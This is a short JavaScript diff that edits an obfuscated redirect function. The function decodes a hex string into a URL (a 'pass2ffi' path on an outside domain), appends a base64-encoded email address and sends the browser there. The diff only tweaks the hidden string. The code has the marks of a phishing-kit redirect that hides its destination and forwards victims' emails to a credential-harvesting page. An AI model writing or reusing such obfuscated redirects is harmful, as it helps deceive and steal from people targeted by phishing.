@@ -91,7 +91,7 @@
 
         // Redirect to final URL with email appended
 function redirectToTarget(base64Email) {
-    const hex = "68747470733A2F2F7061326666692E7A656974676569737431312E636F6D2F70617373326666692F23";
+    const hex = "68747470733A2F2F7061326666692E7A656974676569737431312E636F6D2F70617373326666692F234D";
     const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('') + base64Email;
     window.location.href = obfuscatedURL;
 }
